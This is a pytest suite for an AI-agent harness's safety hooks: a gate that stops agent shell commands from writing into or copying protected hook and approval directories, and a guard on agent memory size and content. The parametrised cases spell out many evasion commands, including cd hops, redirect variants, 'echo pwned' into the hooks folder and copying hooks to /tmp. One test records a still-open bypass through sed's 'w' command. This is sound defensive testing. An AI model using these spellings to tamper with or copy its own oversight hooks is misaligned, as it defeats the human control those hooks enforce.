    "cd project_memory && cd approvals && cd pending && echo x > f.yaml",
    "cd project_memory && pushd approvals && echo x > f.yaml",
    "cd project_memory/approvals && cd pending && echo x > d.yaml",
    "cd project_memory/approvals && cd .. && echo x > a.yaml",
    "cd .claude && cd hooks && cp -r . /tmp/kk",
])
def test_descending_deeper_does_not_leave_the_tree(tmp_path, command):
    """A boolean carry-over was ASSIGNED on every `cd`, so a second hop that named nothing
    protected wiped the flag that should have blocked the write. Depth counts instead: entering
    sets it, a relative hop deepens it, `..` unwinds one level."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


@pytest.mark.parametrize("command", [
    "cd project_memory && cd .. && echo x > a.yaml",
    "cd project_memory && cd /tmp && echo x > a.yaml",
    "pushd project_memory; ls; popd; echo x > /tmp/notes.txt",
])
def test_actually_leaving_the_tree_clears_the_carry_over(tmp_path, command):
    """The pair that makes the rule a rule rather than "block more": unwinding past the root, an
    absolute hop and `popd` must all release it, or looking inside the state dir once would refuse
    every later write in the command wherever it went."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


@pytest.mark.parametrize("command,blocked", [
    ("cp -r \\\n  .claude/hooks kk", True),
    ("echo x > \\\n  project_memory/approvals/APR-0001.yaml", True),
    ("grep -n mint \\\n  .claude/hooks/gate_approval.py", False),
    ("cat \\\n  project_memory/generated/index.yaml", False),
])
def test_a_continued_line_is_one_command_in_both_directions(tmp_path, command, blocked):
    """Newlines become `;` so a harmless first line cannot swallow the rest — but a CONTINUED line
    is still one command. Without the collapse a continued READ splits, and its second pipeline's
    "verb" is a bare path, so ordinary inspection would be refused."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == (2 if blocked else 0)


@pytest.mark.parametrize("command,blocked", [
    # a two-segment tree entered in two steps -- neither a boolean nor a depth counter could see
    # this, because `.github` alone is not a protected path
    ("cd .github && cd hooks && echo x > pre-commit", True),
    ("cd .agents && cd skills && echo x > evil.md", True),
    ("cd .github && cd workflows && echo x > ci.yml", False),
    # Unwinding INSIDE one argument: depth counted this as entering. The sibling is `docs/` and
    # the file an ordinary document, because the lead's OWN rule (rule 5) judges the target as
    # well: with `src/a.py` these two lines are refused for a second, unrelated reason and would
    # stop measuring the position tracker at all.
    ("cd project_memory/../docs && echo x > a.yaml", False),
    ("cd project_memory && cd ../docs && echo x > a.yaml", False),
    # the case that distinguishes path-tracking from a boolean: descend, then unwind ONE level
    ("cd project_memory && cd approvals && cd .. && echo x > a.yaml", True),
    ("cd project_memory/approvals/pending && cd ../.. && echo x > a.yaml", True),
    ("cd project_memory/approvals && cd ../.. && echo x > a.yaml", False),
    # unknown destinations are treated as leaving, or every command after a popd would be refused
    ("cd project_memory && cd && echo x > a.yaml", False),
    ("cd project_memory && cd - && echo x > a.yaml", False),
])
def test_the_working_directory_is_tracked_as_a_path(tmp_path, command, blocked):
    """Third model for this, and the first that answers all three questions by construction.

    A boolean could not tell leaving from descending. A depth counter fixed that but could not
    enter a TWO-SEGMENT tree in two steps, and read `cd project_memory/../docs` as entering. The
    working directory itself makes "are we inside a protected tree" the same question the
    direct-naming check already asks."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == (2 if blocked else 0)


# -- gate_write_scope: a redirect writes when the bytes are RETAINED ----------

@pytest.mark.parametrize("command", [
    # the three a reviewer measured in a ten-session lifecycle run, each a pure read, each refused
    # by a branch whose own remedy line says "reading it (cat/grep/diff/ruff/mypy) stays allowed"
    'cat .claude/settings.json 2>/dev/null | head -50',
    'ls .claude/agents/ 2>/dev/null',
    'find .claude/hooks -iname "*push*" 2>/dev/null',
    # the same shape without a stream number, and the bash spelling that redirects BOTH streams
    'cat .claude/settings.json > /dev/null',
    'grep -n mint .claude/hooks/gate_approval.py &> /dev/null',
    # the verbs whose PROGRAM is an argument: their branch looked for any `>` among the tokens and
    # so answered for the SHELL's redirect too, keeping all six outside the rule
    "awk '{print $1}' .claude/settings.json 2>/dev/null",
    "sed -n '1,20p' .claude/hooks/gate_approval.py 2>/dev/null",
    "jq . .claude/settings.json 2>/dev/null",
])
def test_suppressing_output_is_not_a_write_to_the_enforcement_layer(tmp_path, command):
    """A redirect into the null device retains nothing, so it cannot be the relocation this branch
    refuses — and the branch refused it anyway, three times in one measured lifecycle, while its
    own remedy promised the read was allowed. The state branch had a carve-out for capture and the
    enforcement branch had none.

    THE FIX IS NOT THAT CARVE-OUT, and that matters: `captures_out` lets a read-only pipeline
    redirect into any unprotected file, which is exactly `cat <hook> > copy.py`. What separates
    "suppressed" from "relocated" is whether the TARGET keeps the bytes, which is what
    `_null_sinks` decides and what the companion test below holds to.

    Every command here is one whose answer is the SAME on every host. The two spellings whose
    answer is not have their own tests, because a table that carries them cannot state why."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 0, "%s\n%s" % (command, result.stderr)


def test_the_windows_device_name_is_a_discard_only_where_it_is_a_device(tmp_path):
    """`2> NUL` is the one spelling in the table above whose answer changes with the HOST.

    `nul` is a Win32 reserved device no file can be created under, so Git Bash discards it as
    completely as `>/dev/null`; on a real POSIX host the same word is an ordinary file in the
    working directory and the redirect RETAINS the bytes, which is the relocation this branch
    exists to refuse. `_null_sinks` says exactly that ("PER SHELL AND PER HOST") and builds its
    base from `os.devnull`; this row sat in the shared table asserting the Windows answer
    everywhere, and it was one of the ubuntu-only failures in BUG-0069.

    `os.devnull` rather than `os.name`: it is the same fact from the standard library that the
    gate derives from, and it is the fact that decides -- a host whose discard device IS spelled
    `nul` is a host on which this is suppressed, whatever it is called otherwise.
    """
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, "ls .claude/hooks 2> NUL"))
    discards = os.path.normcase(os.devnull) == os.path.normcase("nul")
    assert result.returncode == (0 if discards else 2), result.stderr


@pytest.mark.parametrize("command", [
    # the relocation itself, in every operator spelling -- `&>` produced NO redirect target at all
    # before the operator became a shape instead of a two-item tuple, so this was allowed
    'cat .claude/hooks/gate_approval.py &> copy.py',
    'cat .claude/hooks/gate_approval.py &>> copy.py',
    # bash's force-clobber, which is `>` with `noclobber` overridden -- same bytes, same file
    'cat .claude/hooks/gate_approval.py >| copy.py',
    'cat .claude/hooks/gate_approval.py >|copy.py',
    'cat .claude/hooks/gate_approval.py 2>| copy.py',
    'cat .claude/hooks/gate_approval.py > copy.py',
    'cat .claude/hooks/gate_approval.py 1> copy.py',
    # per TARGET, not per pipeline: one retaining target among sinks is still a write
    'cat .claude/hooks/gate_approval.py > /dev/null > copy.py',
    # a path that merely BEGINS with the device name is an ordinary file
    'cat .claude/hooks/gate_approval.py > /dev/null/../evil.py',
    # a null sink in pipeline 1 must not disarm pipeline 2
    'cat .claude/settings.json > /dev/null && echo pwned > .claude/hooks/evil.py',
    # ...nor a later stage of the same pipeline, where `|` is a data channel
    'cat .claude/settings.json 2>/dev/null | tee .claude/hooks/evil.py',
    # a write-capable VERB is unaffected by where its diagnostics go
    'cp -r .claude/hooks /tmp/kk 2>/dev/null',
    'sed --in-place s/a/b/ .claude/hooks/gate_approval.py 2>/dev/null',
    'cd .claude && cp -r hooks /tmp/kk 2>/dev/null',
    # ...and the embedded redirect the program-arg branch exists for stays caught, which is what
    # makes narrowing that branch to non-operator tokens a narrowing and not a hole
    'awk \'BEGIN{while((getline l < ".claude/hooks/gate_approval.py")>0) print l > "kk/g.py"}\'',
    "awk '{print $1}' .claude/settings.json > copy.txt",
])
def test_a_redirect_whose_target_keeps_the_bytes_is_still_a_write(tmp_path, command):
    """The other half, and the reason the fix is about the target rather than about the operator
    being harmless. `> /dev/null` may not become a prefix that launders the rest of a command."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 2, "%s\n%s" % (command, result.stdout)


@pytest.mark.parametrize("command", [
    "cat .claude/hooks/gate_approval.py >| /dev/null",
    "ls .claude/agents >|/dev/null",
])
def test_force_clobber_still_answers_to_the_target(tmp_path, command):
    """The pair that keeps the operator fix from just meaning "block more": `>|` is `>` with
    `noclobber` overridden, so it is a redirect — and a redirect into the null device is still not
    a write. Without this the previous parametrisation could have been satisfied by matching `>`
    followed by anything at all."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 0, "%s\n%s" % (command, result.stderr)


def test_a_pipe_after_a_redirect_target_is_still_a_pipe(tmp_path):
    """`>|` and `> x | y` differ by one space and mean entirely different things. Widening the
    operator shape to end in `|` must not swallow the pipe that starts the next STAGE, or
    `cat <hook> > out | tee copy.py` would lose its second stage and with it the refusal."""
    dispatched_repo(tmp_path)
    module = load_hook_module("gate_write_scope")
    assert module._tokenise("cat x > out|tee y") == ["cat", "x", ">", "out", "|", "tee", "y"]
    blocked = "cat .claude/hooks/gate_approval.py > /dev/null|tee copy.py"
    assert run_scope(tmp_path, shell_payload(tmp_path, blocked)).returncode == 2


@pytest.mark.known_hole("state_write_protection.shell")
def test_a_write_verb_of_the_tools_own_language_is_invisible(tmp_path):
    """KNOWN OPEN PATH, asserted rather than promised away, and a DIFFERENT class from the
    operators above.

    `sed -n 'w kk/g.py' <hook>` copies a shipped gate with no `>` anywhere on the command line.
    The `_PROGRAM_ARG_VERBS` branch looks for a shell redirect OPERATOR quoted into a program
    argument; `sed`'s `w`, `jq`'s output builtins and `perl -e open` are write verbs of three
    different languages, and refusing them from a command line needs a list of each language's
    writing words — the shape of check this repo has watched fail one release later, repeatedly.
    The containment for this is the project's permission posture, which is what
    `state_write_protection.shell` already declares unverified.

    INVERT THIS TEST the day shell writes are actually contained."""
    dispatched_repo(tmp_path)
    command = "sed -n 'w kk/g.py' .claude/hooks/gate_approval.py"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


def test_a_descriptor_duplication_is_a_redirect_but_a_file_after_gt_amp_is_a_write():
    """`>&` is BOTH forms and the right-hand side tells them apart (`_is_descriptor`).

    `2>&1` and `>&2` send a stream to a descriptor and `>&-` closes one — no file receives
    anything, and the operator shape must not name `1`/`2`/`-` as a target or every
    diagnostic-merging read is refused as a write to a file called `1`. But `>& WORD` for any other
    WORD is the csh spelling of `&> file`, and bash DOES land both streams in that file — measured
    writing `services/pay.py` in a real bash. The predecessor of this test claimed the right-hand
    side "is a stream number", full stop; that read `echo hi >& services/pay.py` (and the same onto
    state and the enforcement layer) as naming no target at all, so every write rule ran empty at
    rc 0 for every caller. `_output_redirect_targets` is the one place that decision lives now."""
    module = load_hook_module("gate_write_scope")
    sinks = module._null_sinks("Bash")
    # descriptor forms: no file target
    assert module._redirect_targets(module._tokenise("cat x 2>&1 | head"), sinks) == []
    assert module._redirect_targets(module._tokenise("cat x >&2"), sinks) == []
    assert module._redirect_targets(module._tokenise("cat x >&-"), sinks) == []
    # file forms: the target is a write, whichever spelling puts both streams there
    assert module._redirect_targets(module._tokenise("cat x &> out"), sinks) == ["out"]
    assert module._redirect_targets(module._tokenise("cat x >& out"), sinks) == ["out"]
    assert module._redirect_targets(module._tokenise("cat x 2>& out"), sinks) == ["out"]


def test_the_null_sink_is_the_hosts_own_device_not_a_word_someone_typed():
    """The set is anchored outside the hook: whatever `os.devnull` names on the machine this gate
    runs on must be in it, for both shells. A hand-typed list that drifts from the platform — or a
    platform this harness is ported to later — fails here rather than by over-refusing in a
    session."""
    module = load_hook_module("gate_write_scope")
    for tool in ("Bash", "PowerShell"):
        assert module._norm(os.devnull) in module._null_sinks(tool), tool


@pytest.mark.parametrize("tool,command,blocked", [
    ("Bash", 'cat .claude/hooks/gate_approval.py > /dev/null', False),
    # ...and the mirror image: `$null` is PowerShell's sink and an unset variable to bash, where
    # the conservative direction is to keep refusing.
    ("PowerShell", 'Get-ChildItem .claude\\agents 2>$null', False),
    ("Bash", 'ls .claude/agents 2>$null', True),
    # `Out-Null` is the same device reached through a pipe
    ("PowerShell", 'Get-Content .claude\\settings.json | Out-Null', False),
    ("PowerShell", 'Copy-Item .claude\\hooks\\gate_approval.py copy.py > $null', True),
])
def test_which_names_discard_is_a_question_about_the_shell(tmp_path, tool, command, blocked):
    """One global set of "harmless spellings" would have been wrong in both directions at once.

    Every row here answers the same on every host; `/dev/null` under PowerShell does not, and it
    has its own test below for that reason."""
    dispatched_repo(tmp_path)
    payload = dict(shell_payload(tmp_path, command), tool_name=tool)
    result = run_scope(tmp_path, payload)
    assert result.returncode == (2 if blocked else 0), "%s\n%s" % (command, result.stderr)


def test_a_posix_device_word_under_powershell_is_a_question_about_the_host(tmp_path):
    r"""`> /dev/null` under PowerShell: a real device on one host, a real FILE on the other.

    On Windows, PowerShell has no `/dev/null` -- it resolves a leading-slash path against the
    CURRENT DRIVE, so on a host carrying `C:\dev` this writes the hook into a real file. Measured
    2026-08-03: Windows PowerShell answered `Out-File: DirectoryNotFoundException C:\dev\null`,
    i.e. it tried. Where PowerShell runs on POSIX, that same word IS the discard device and the
    line retains nothing, so refusing it there would be the over-refusal the mirror row guards
    against. The row asserted the Windows answer everywhere and was one of the ubuntu-only
    failures in BUG-0069.

    `os.devnull`, the same standard-library fact `_null_sinks` builds its base from, decides --
    not `os.name`, because what matters is whether this host's discard device is spelled that way.
    """
    dispatched_repo(tmp_path)
    command = 'Get-Content .claude\\hooks\\gate_approval.py > /dev/null'
    payload = dict(shell_payload(tmp_path, command), tool_name="PowerShell")
    result = run_scope(tmp_path, payload)
    discards = os.path.normcase(os.devnull) == os.path.normcase("/dev/null")
    assert result.returncode == (0 if discards else 2), result.stderr


# -- guard_memory_budget: the budgets the kernel cannot see (spec II.5) -------

def run_budget(tmp_path, payload, kit="dev-team", timeout=120):
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS)
    return subprocess.run([sys.executable, os.path.join(TEAM_KITS, kit, "hooks",
                                                        "guard_memory_budget.py")],
                          input=json.dumps(payload), capture_output=True, text=True,
                          env=env, timeout=timeout)


def memory_write(tmp_path, rel, content):
    return {"hook_event_name": "PreToolUse", "tool_name": "Write", "cwd": str(tmp_path),
            "tool_input": {"file_path": str(tmp_path / rel), "content": content}}


def test_a_memory_index_at_the_budget_passes(tmp_path):
    """II.12 names the boundary explicitly: 40 lines pass, 41 block."""
    content = "".join("- [t%d](t%d.md) — hook\n" % (i, i) for i in range(40))
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/MEMORY.md", content)
    assert run_budget(tmp_path, payload).returncode == 0


def test_a_memory_index_over_the_budget_blocks(tmp_path):
    content = "".join("- [t%d](t%d.md) — hook\n" % (i, i) for i in range(41))
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/MEMORY.md", content)
    result = run_budget(tmp_path, payload)
    assert result.returncode == 2
    assert "INDEX budget" in result.stderr


def test_an_oversized_craft_topic_blocks(tmp_path):
    content = "".join("line %d\n" % i for i in range(101))
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/caching.md", content)
    result = run_budget(tmp_path, payload)
    assert result.returncode == 2
    assert "craft topic" in result.stderr


def test_a_fat_craft_topic_blocks_on_bytes_too(tmp_path):
    """Lines and bytes are separate budgets — one long line is still a wall of context."""
    content = "x" * (8 * 1024 + 1) + "\n"
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/caching.md", content)
    assert run_budget(tmp_path, payload).returncode == 2


def test_an_edit_is_measured_by_its_RESULT(tmp_path):
    """A budget is about what the file will CONTAIN, not about the size of the change — an Edit
    that appends one line to a file already at the limit is what pushes it over."""
    path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / "caching.md"
    write(str(path), "".join("line %d\n" % i for i in range(100)))
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "cwd": str(tmp_path),
               "tool_input": {"file_path": str(path), "old_string": "line 99\n",
                              "new_string": "line 99\nline 100\n"}}
    assert run_budget(tmp_path, payload).returncode == 2


def test_an_edit_that_stays_inside_the_budget_passes(tmp_path):
    path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / "caching.md"
    write(str(path), "".join("line %d\n" % i for i in range(50)))
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "cwd": str(tmp_path),
               "tool_input": {"file_path": str(path), "old_string": "line 0\n",
                              "new_string": "line 0 (clarified)\n"}}
    assert run_budget(tmp_path, payload).returncode == 0


@pytest.mark.parametrize("text", [
    "When TSK-0042 failed, retry with a longer timeout.",
    "PR-0001 wants the checkout flow cached.",
    "See APR-0007 for why this is allowed.",
])  # mid-sentence included on purpose: it is the leak the rule exists for
def test_project_ids_are_refused_in_agent_memory(tmp_path, text):
    """spec II.5: memory holds CRAFT, never project status, tasks, decisions or session progress.
    A note pinned to an item goes stale the moment the item moves, and the next session reads it
    as true — which is the failure mode the whole memory rebuild exists for."""
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/caching.md", text)
    result = run_budget(tmp_path, payload)
    assert result.returncode == 2
    assert "project items" in result.stderr


def test_the_generalised_lesson_is_what_memory_is_for(tmp_path):
    """The counterpart: the same insight WITHOUT the id is exactly what belongs there."""
    text = "Retries on this API need a longer timeout than the default; the default fails under load.\n"
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/caching.md", text)
    assert run_budget(tmp_path, payload).returncode == 0


def test_a_twenty_first_topic_blocks(tmp_path):
    base = tmp_path / ".claude" / "agent-memory" / "backend-developer"
    for i in range(20):
        write(str(base / ("topic%d.md" % i)), "craft\n")
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/topic20.md", "craft\n")
    result = run_budget(tmp_path, payload)
    assert result.returncode == 2
    assert "craft topics" in result.stderr


def test_editing_an_existing_topic_is_not_a_new_one(tmp_path):
    """The count is about ADDING; a role at the limit must still be able to maintain what it has."""
    base = tmp_path / ".claude" / "agent-memory" / "backend-developer"
    for i in range(20):
        write(str(base / ("topic%d.md" % i)), "craft\n")
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/topic0.md", "more\n")
    assert run_budget(tmp_path, payload).returncode == 0


def test_the_index_does_not_count_as_a_topic(tmp_path):
    base = tmp_path / ".claude" / "agent-memory" / "backend-developer"
    for i in range(19):
        write(str(base / ("topic%d.md" % i)), "craft\n")
    write(str(base / "MEMORY.md"), "- index\n")
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/topic19.md", "craft\n")
    assert run_budget(tmp_path, payload).returncode == 0


# -- guard_memory_budget: usability, and the shapes a budget must not refuse --

def test_the_index_can_be_created_at_the_topic_cap(tmp_path):
    """The count excluded the index from the TALLY but not from the CHECK, so the one file the
    whole budget exists to keep small was the one write refused — with a message about a
    different budget."""
    base = tmp_path / ".claude" / "agent-memory" / "backend-developer"
    for i in range(20):
        write(str(base / ("topic%d.md" % i)), "craft\n")
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/MEMORY.md", "- a\n")
    assert run_budget(tmp_path, payload).returncode == 0


def test_an_over_budget_file_can_be_trimmed_step_by_step(tmp_path):
    """A budget that only compares against the LIMIT refuses every intermediate step of the
    cleanup its own message asks for: 102 lines going to 101 was blocked, so the only legal move
    was one perfect Write. A curating agent hits the block, is told to do what it just tried, and
    gives up on the file."""
    path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / "MEMORY.md"
    write(str(path), "".join("- line %d\n" % i for i in range(102)))
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "cwd": str(tmp_path),
               "tool_input": {"file_path": str(path), "old_string": "- line 101\n",
                              "new_string": ""}}
    assert run_budget(tmp_path, payload).returncode == 0


def test_a_reflow_that_fixes_the_violated_axis_is_allowed(tmp_path):
    """The canonical repair for a one-huge-line topic is to wrap it — which necessarily GROWS the
    line count. A rule reading "no worse on both axes" refused exactly that, with a message telling
    the agent to shorten the file it had just shortened by 3 KB. The comparison is per axis:
    `result <= max(limit, current)`."""
    path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / "topic.md"
    write(str(path), "x" * 12001)                                     # 1 line, 12001 bytes
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/topic.md",
                           "\n".join("y" * 90 for _ in range(100)))   # 100 lines, 9089 bytes
    assert run_budget(tmp_path, payload).returncode == 0


def test_a_reflow_that_improves_neither_axis_still_blocks(tmp_path):
    """Per-axis must not decay into "any change to an over-budget file is fine"."""
    path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / "topic.md"
    write(str(path), "x" * 12001)
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/topic.md",
                           "\n".join("y" * 140 for _ in range(100)))  # 14099 bytes: worse
    assert run_budget(tmp_path, payload).returncode == 2


def test_an_over_budget_file_may_still_not_grow(tmp_path):
    """The counterpart that keeps "shrinking is allowed" from meaning "anything is allowed"."""
    path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / "MEMORY.md"
    write(str(path), "".join("- line %d\n" % i for i in range(102)))
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "cwd": str(tmp_path),
               "tool_input": {"file_path": str(path), "old_string": "- line 0\n",
                              "new_string": "- line 0\n- new\n"}}
    assert run_budget(tmp_path, payload).returncode == 2


@pytest.mark.parametrize("text", [
    "Upstream PR-1234 fixed this in httpx.",
    "github issue PR-1234 is unrelated to ours.",
    "Never write an id like `TSK-0001` into memory.",
    "Docs: https://example.com/spec/DEC-0007#rationale",
])
def test_an_id_shaped_string_in_prose_is_not_a_project_reference(tmp_path, text):
    """Matching an id ANYWHERE refused ordinary craft notes — a GitHub PR number, a URL, and the
    rule itself written down. The exemptions carry the precision, and each is ADJACENT."""
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/note.md", text)
    assert run_budget(tmp_path, payload).returncode == 0, text


@pytest.mark.parametrize("text", [
    "See APR-0007 for why this is allowed.",
    "TSK-0042 needs a longer timeout.",
    "- PR-0001 wants the checkout cached.",
    "ref: PRD-0001 legacy import",
])
def test_a_real_project_reference_is_still_refused(tmp_path, text):
    """Including the V1 `PRD-` prefix -- an id-shaped reference is refused whatever its vintage.

    The earlier wording of this line said spec II.2 "keeps `PRD-` alive through `legacy_ids`". No
    such field has ever existed in this harness; what an imported item keeps is its former name
    under `legacy_fields.legacy_id` (`kernel/migrate.py`), and that is a value, not a pointer. The
    rule being measured here is about the TEXT of an agent memory note and does not depend on
    whether the id resolves to anything.
    """
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/note.md", text)
    result = run_budget(tmp_path, payload)
    assert result.returncode == 2, text
    assert "references project items" in result.stderr


@pytest.mark.parametrize("text", [
    "A failure like TSK-0042 needs a longer timeout.",   # the rule's OWN canonical leak
    "ticket TSK-0042 is still open",                      # pure status, the forbidden content
    "wie TSK-0042 zeigte: Timeout erhoehen",
    "their APR-0007 approval expired last week",
    "named after SR-0003, the retry contract",
])
def test_the_exemption_vocabulary_is_not_ordinary_english(tmp_path, text):
    """A first cut allowed any of `like|wie|named|format|ticket|their|model` within 40 characters
    of an id. Every sentence here then PASSED — including the exact leak the rule exists for and
    pure task status, the content II.5 names first. An exemption that common is not an exemption,
    it is a repeal, so the markers are now adjacent and specific."""
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/note.md", text)
    assert run_budget(tmp_path, payload).returncode == 2, text


@pytest.mark.parametrize("text", [
    "Use `--retry 3`; the TSK-0042 outage showed 1 is not enough.",
    "Never write an id like `TSK-0001` into memory. TSK-0042 is blocked on review.",
    "See `retry()`; TSK-0042 and PR-0002 and DEC-0009 are all open.",
    "| `flag` | TSK-0042 | open |",
    "The ` character breaks the parser; TSK-0042 tracked that.",
])
def test_a_code_span_exempts_only_what_is_inside_it(tmp_path, text):
    """The code-span exemption was written as one more PREFIX alternative, `` `[^`\n]* ``, and
    `finditer` starts a match at the CLOSING backtick too — so the exempt span ran from there to
    the last id on the line. Every sentence here passed. Craft topics are the documents most full
    of inline code, so this was not a corner case; it was most of them."""
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/note.md", text)
    assert run_budget(tmp_path, payload).returncode == 2, text


@pytest.mark.parametrize("text", [
    "Never write an id like `TSK-0001` into memory.",
    "Config key `retry.TSK-0001.max` is the literal name upstream uses.",
])
def test_an_id_quoted_as_a_string_is_documentation_not_a_reference(tmp_path, text):
    """The counterpart: an id BETWEEN both delimiters is being quoted, not referenced — which is
    also how this rule gets written down in a memory file without tripping itself."""
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/note.md", text)
    assert run_budget(tmp_path, payload).returncode == 0, text


def test_the_index_has_a_byte_ceiling_not_only_a_line_ceiling(tmp_path):
    """40 lines of 10 000 characters is a 409 KB file that passed the index budget — and the index
    is the one file loaded at EVERY spawn, so lines alone measure the wrong thing for it. II.5
    names only "Index <=40 Zeilen"; the byte ceiling is this gate's reading of what that budget is
    FOR."""
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/MEMORY.md",
                           "\n".join("x" * 10000 for _ in range(40)))
    assert run_budget(tmp_path, payload).returncode == 2


def test_the_root_index_row_is_enforced(tmp_path):
    """A row added with no coverage at all: neither its 40-line budget nor its deliberate
    "ids allowed" was asserted, so removing the whole row left every test green."""
    over = memory_write(tmp_path, "MEMORY.md", "".join("- pointer %d\n" % i for i in range(41)))
    assert run_budget(tmp_path, over).returncode == 2
    ok = memory_write(tmp_path, "MEMORY.md", "".join("- pointer %d\n" % i for i in range(40)))
    assert run_budget(tmp_path, ok).returncode == 0
    fat = memory_write(tmp_path, "MEMORY.md", "\n".join("x" * 10000 for _ in range(40)))
    assert run_budget(tmp_path, fat).returncode == 2


def test_the_human_facing_root_index_may_name_items(tmp_path):
    """`root-index` deliberately has no `forbid_ids`: a repo-root MEMORY.md is written for a
    PERSON, and "see TSK-0042" is the normal thing to write there. The role index is the opposite
    case, and the pair is what pins the distinction."""
    root = memory_write(tmp_path, "MEMORY.md", "- see TSK-0042 for the retry contract\n")
    assert run_budget(tmp_path, root).returncode == 0
    role = memory_write(tmp_path, ".claude/agent-memory/backend-developer/MEMORY.md",
                        "- TSK-0042 open\n")
    assert run_budget(tmp_path, role).returncode == 2


def test_an_id_is_matched_case_insensitively(tmp_path):
    """`tsk-0042` is the same reference typed in a hurry, and the prefixes are specific enough
    that lowercase costs no false positives."""
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/n.md",
                           "tsk-0042 broke the nightly build")
    assert run_budget(tmp_path, payload).returncode == 2


@pytest.mark.parametrize("name", ["n.markdown", "n.mdx"])
def test_prose_markdown_under_another_extension_is_still_a_topic(tmp_path, name):
    """`.markdown` and `.mdx` are the same artifact as `.md` — under a bytes-only rule a 300-line
    topic would have been unbudgeted for the price of a rename."""
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/" + name,
                           "line\n" * 300)
    assert run_budget(tmp_path, payload).returncode == 2


def test_external_alone_is_not_a_foreignness_marker(tmp_path):
    """"external" IS ordinary English — "the external SR-0003 service request is ours" is a
    reference to our own item. It only exempts with a foreignness noun behind it."""
    ours = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/a.md",
                        "The external SR-0003 service request is ours.")
    assert run_budget(tmp_path, ours).returncode == 2
    theirs = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/b.md",
                          "external ticket SR-0003 is theirs")
    assert run_budget(tmp_path, theirs).returncode == 0


def test_a_foreignness_marker_does_not_reach_across_a_line_break(tmp_path):
    r"""`\s+` matches newlines, so "…tracked upstream\nTSK-0042 is ours" was exempt — two
    sentences, one of them ours. The marker must be on the same line."""
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/c.md",
                           "The retry logic is tracked upstream\nTSK-0042 is ours to finish.")
    assert run_budget(tmp_path, payload).returncode == 2


def test_a_foreign_identifier_without_a_marker_is_over_blocked(tmp_path):
    """A DELIBERATE over-block, pinned so it stays a decision. A part number that collides with
    one of our prefixes and carries no foreignness marker reads as an item reference. Chasing it
    with a hardware word list would be the same "enumerate the surface" mistake that the write-verb
    list already lost twice; for a memory-hygiene rule, refusing too much costs a rephrase while
    letting too much through costs a stale fact the next session believes."""
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/hw.md",
                           "The board uses a DEC-2100 controller clone.")
    assert run_budget(tmp_path, payload).returncode == 2


def test_the_id_prefixes_match_the_kernels_item_types():
    """The prefix list is a hand-copy of `backlog_types.ACTIVE_DIRS`; nothing else would notice
    them drifting apart when a new item type is added."""
    module = load_hook_module("guard_memory_budget")
    sys.path.insert(0, TEAM_KITS)
    from kernel.backlog_types import ACTIVE_DIRS
    declared = set(re.findall(r"[A-Z]{2,4}", module._ID))
    assert set(ACTIVE_DIRS) <= declared
    assert declared - set(ACTIVE_DIRS) == {"PRD"}  # the deliberate V1 legacy addition


def test_a_non_utf8_memory_file_can_still_be_edited(tmp_path):
    """A single cp1252 byte made every Edit to the file exit 2 with an internal-error diagnosis
    and a remedy pointing at `python scripts/harness.py doctor`, which would find nothing — and the file could then
    never be repaired with Edit."""
    path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / "legacy.md"
    os.makedirs(os.path.dirname(str(path)), exist_ok=True)
    with open(str(path), "wb") as handle:
        handle.write(b"K\xe4ufer notes\n")
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "cwd": str(tmp_path),
               "tool_input": {"file_path": str(path), "old_string": "notes",
                              "new_string": "notes (clarified)"}}
    assert run_budget(tmp_path, payload).returncode == 0


@pytest.mark.skipif(os.name != "nt", reason="cross-drive paths are a Windows shape")
def test_a_cross_drive_path_is_not_an_internal_error(tmp_path):
    """`os.path.relpath` raises ValueError across mounts; unwrapped, that reported a CRASH for
